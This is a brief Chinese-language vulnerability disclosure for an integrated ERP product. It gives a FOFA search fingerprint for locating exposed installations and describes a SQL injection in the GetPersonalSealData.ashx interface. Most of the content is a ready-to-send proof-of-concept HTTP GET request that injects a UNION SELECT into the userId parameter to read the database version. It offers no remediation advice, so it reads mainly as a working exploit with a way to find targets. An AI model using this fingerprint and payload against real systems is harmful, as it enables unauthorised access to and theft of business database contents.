**fofa**

```
body="SYSA/images/zbintelsng.png"
```

**一、漏洞简述**

某邦一体化ERP将企业物流、资金流、信息流等所有资源整合在一起，对销售、采购、生产、成本、库存、分销、运输、财务、人力资源进行规划，在一套系统内解决企业所有的管理问题，数据实时共享，全程监控各个环节的运转和协作，让企业最大限度利用现有资源取得最佳经济效益。其接口GetPersonalSealData.ashx存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

**二、漏洞检测poc**

```yaml
GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version-- HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
```

